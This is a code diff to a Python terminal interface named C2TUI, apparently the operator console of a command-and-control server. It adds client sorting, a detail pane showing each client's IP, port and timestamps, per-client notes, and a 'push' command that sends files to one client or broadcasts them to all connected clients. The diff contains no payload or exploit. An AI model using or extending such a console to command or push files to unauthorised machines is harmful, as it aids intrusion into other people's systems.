@@ -5,14 +5,15 @@ from ui.base import BaseUI
 from textual.app import App, ComposeResult
 from textual.widgets import (
     Header, Footer, RichLog, Input, Static,
-    ListView, ListItem, Label
+    ListView, ListItem, Label, Pretty
 )
-from textual.containers import Horizontal, Vertical
+from textual.containers import Horizontal, Vertical, Container
 from textual.events import Key
 
 import threading
 import queue as pyqueue
 import time
+import json
 
 
 HELP_TEXT = (
@@ -21,6 +22,9 @@ HELP_TEXT = (
     "  list                      (delegated to server.list_command())\n"
     "  broadcast <cmd>\n"
     "  client <idprefix|uid> <cmd>\n"
+    "  push <source> <dest>\n"
+    "  note <idprefix|uid> <note>\n"
+    "  clear\n"
     "  <cmd>                     (sends to current TARGET mode)\n"
     "  exit\n"
     "\n"
@@ -30,6 +34,8 @@ HELP_TEXT = (
     "  Ctrl+B    target: BROADCAST\n"
     "  Ctrl+L    list\n"
     "  Ctrl+R    refresh clients\n"
+    "  Ctrl+T    toggle sort mode\n"
+    "  Ctrl+D    toggle detail view\n"
     "  Ctrl+Q    exit\n"
     "\n"
     "History:\n"
@@ -52,6 +58,8 @@ class C2TUI(App):
         ("ctrl+b", "target_broadcast", "Target Broadcast"),
         ("ctrl+l", "do_list", "List"),
         ("ctrl+r", "refresh", "Refresh"),
+        ("ctrl+t", "toggle_sort", "Toggle Sort"),
+        ("ctrl+d", "toggle_detail_view", "Toggle Detail View"),
         ("ctrl+q", "quit", "Quit"),
     ]
 
@@ -64,6 +72,10 @@ class C2TUI(App):
         height: 1;
     }
 
+    #main-pane {
+        height: 1fr;
+    }
+
     #clients {
         width: 40;
         height: 1fr;
@@ -73,6 +85,12 @@ class C2TUI(App):
     #log {
         height: 1fr;
         border: solid $primary;
+    }
+
+    #detail-view {
+        height: 1fr;
+        border: solid $primary;
+        display: none; /* Initially hidden */
     }
 
     #input {
@@ -89,6 +107,7 @@ class C2TUI(App):
         self.status = Static("Ready", id="status")
         self.clients_view = ListView(id="clients")
         self.log_widget = RichLog(id="log", markup=True, auto_scroll=True)
+        self.detail_view = Pretty("", id="detail-view")
         self.cmd_input = Input(
             placeholder="Type a command (F1 help). Default sends to TARGET.",
             id="input"
@@ -102,6 +121,12 @@ class C2TUI(App):
         self._history: list[str] = []
         self._hist_idx: int = -1
 
+        # Sorting
+        self._sort_cycle = ["id", "status", "ip", "idle"]
+        self._sort_mode = self._sort_cycle[0]
+        self._sort_reverse = False
+        self._detail_view_visible = False
+
         # Timer handle
         self._client_refresh_timer = None
 
@@ -111,8 +136,11 @@ class C2TUI(App):
             self.status,
             Horizontal(
                 self.clients_view,
-                self.log_widget,
-                id="root",
+                Container(
+                    self.log_widget,
+                    self.detail_view,
+                ),
+                id="main-pane",
             ),
             self.cmd_input,
         )
@@ -167,6 +195,24 @@ class C2TUI(App):
         self.refresh_client_list()
         self.log_widget.write("[i]Client list refreshed[/i]")
 
+    def action_toggle_sort(self) -> None:
+        """Cycles through sort modes."""
+        current_idx = self._sort_cycle.index(self._sort_mode)
+        next_idx = (current_idx + 1) % len(self._sort_cycle)
+        self._sort_mode = self._sort_cycle[next_idx]
+        self.log_widget.write(f"[i]Sort mode set to: {self._sort_mode.upper()}[/i]")
+        self.refresh_client_list()
+
+    def action_toggle_detail_view(self) -> None:
+        """Toggles the detail view."""
+        self._detail_view_visible = not self._detail_view_visible
+        if self._detail_view_visible:
+            self.update_detail_view()
+        else:
+            self.detail_view.display = False
+            self.log_widget.display = True
+
+
     def action_quit(self) -> None:
         self.status.update("Stopping...")
         self.server.running = False
@@ -190,6 +236,16 @@ class C2TUI(App):
 
             with self.server.lock:
                 clients = list(self.server.clients.values())
+
+            # Sorting logic
+            if self._sort_mode == "id":
+                clients.sort(key=lambda c: c.unique_id, reverse=self._sort_reverse)
+            elif self._sort_mode == "status":
+                clients.sort(key=lambda c: c.active, reverse=self._sort_reverse)
+            elif self._sort_mode == "ip":
+                clients.sort(key=lambda c: c.ip, reverse=self._sort_reverse)
+            elif self._sort_mode == "idle":
+                clients.sort(key=lambda c: (now - c.last_seen), reverse=self._sort_reverse)
 
             items: list[ClientListItem] = []
             active_uids = set()
@@ -222,6 +278,9 @@ class C2TUI(App):
                         self.selected_uid = it.uid
                         self.clients_view.index = idx
                         break
+            
+            if not self.selected_uid:
+                self.update_detail_view()
 
             self.update_status()
             self.clients_view.refresh()
@@ -234,6 +293,41 @@ class C2TUI(App):
         if isinstance(item, ClientListItem):
             self.selected_uid = item.uid
             self.update_status()
+            self.update_detail_view()
+
+    def update_detail_view(self) -> None:
+        """Updates the detail view with info on the selected client."""
+        if not self.selected_uid or not self._detail_view_visible:
+            self.detail_view.update("")
+            self.detail_view.display = False
+            self.log_widget.display = True
+            return
+
+        with self.server.lock:
+            client = self.server.clients.get(self.selected_uid)
+
+        if not client:
+            self.detail_view.update("")
+            self.detail_view.display = False
+            self.log_widget.display = True
+            return
+
+        with client.lock:
+            now = time.time()
+            data = {
+                "unique_id": client.unique_id,
+                "ip": client.ip,
+                "port": client.port,
+                "active": client.active,
+                "last_seen": f"{int(now - client.last_seen)}s ago",
+                "first_seen": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(client.first_seen)),
+                "note": client.note,
+            }
+
+        self.detail_view.update(json.dumps(data, indent=2))
+        self.detail_view.display = True
+        self.log_widget.display = False
+
 
     # ---------------- input / history ----------------
     def on_key(self, event: Key) -> None:
@@ -298,6 +392,11 @@ class C2TUI(App):
             self.action_do_list()
             return
 
+        if raw == "clear":
+            self.log_widget.clear()
+            self.log_widget.write("Log cleared.")
+            return
+
         if raw.startswith("broadcast "):
             cmd = raw[len("broadcast "):].strip()
             if not cmd:
@@ -321,6 +420,51 @@ class C2TUI(App):
             self.status.update(f"Sending to {uid_prefix[:8]}...: {cmd}")
             self.server.client_command(uid_prefix, cmd)
             self.update_status()
+            return
+
+        if raw.startswith("note "):
+            rest = raw[len("note "):].strip()
+            parts = rest.split(" ", 1)
+            if len(parts) != 2:
+                self.log_widget.write("[!] Usage: note <idprefix|uid> <note>")
+                return
+            uid_prefix, note = parts[0].strip(), parts[1].strip()
+            if not uid_prefix or not note:
+                self.log_widget.write("[!] Usage: note <idprefix|uid> <note>")
+                return
+            
+            with self.server.lock:
+                client = self.server.find_client_by_prefix(uid_prefix)
+
+            if not client:
+                self.log_widget.write(f"[!] No client found with prefix: {uid_prefix}")
+                return
+
+            with client.lock:
+                client.note = note
+            
+            self.log_widget.write(f"Note added to client {client.unique_id[:8]}")
+            self.update_detail_view()
+            return
+
+        if raw.startswith("push "):
+            parts = raw.split(" ")
+            if len(parts) != 3:
+                self.log_widget.write("[!] Usage: push <source_path> <dest_path>")
+                return
+
+            source_path = parts[1]
+            dest_path = parts[2]
+
+            if self.target_mode == "BROADCAST":
+                self.server.push_file_to_all_clients(source_path, dest_path)
+                self.log_widget.write(f"Broadcasting file {source_path} to all clients.")
+            else: # SELECTED
+                if not self.selected_uid:
+                    self.log_widget.write("[!] No client selected.")
+                    return
+                self.server.push_file_to_client(self.selected_uid, source_path, dest_path)
+                self.log_widget.write(f"Pushing file {source_path} to {self.selected_uid[:8]}...")
             return
 
         # Default: send to target mode
@@ -353,7 +497,8 @@ class C2TUI(App):
                     active += 1
 
         sel = self.selected_uid[:8] + "..." if self.selected_uid else "(none)"
-        self.status.update(f"TARGET={self.target_mode} | Selected={sel} | Active={active}")
+        sort = self._sort_mode.upper()
+        self.status.update(f"TARGET={self.target_mode} | Selected={sel} | Active={active} | Sort={sort}")
 
         if self.target_mode == "BROADCAST":
             self.cmd_input.placeholder = "TARGET=BROADCAST — type command to broadcast (F1 help)"
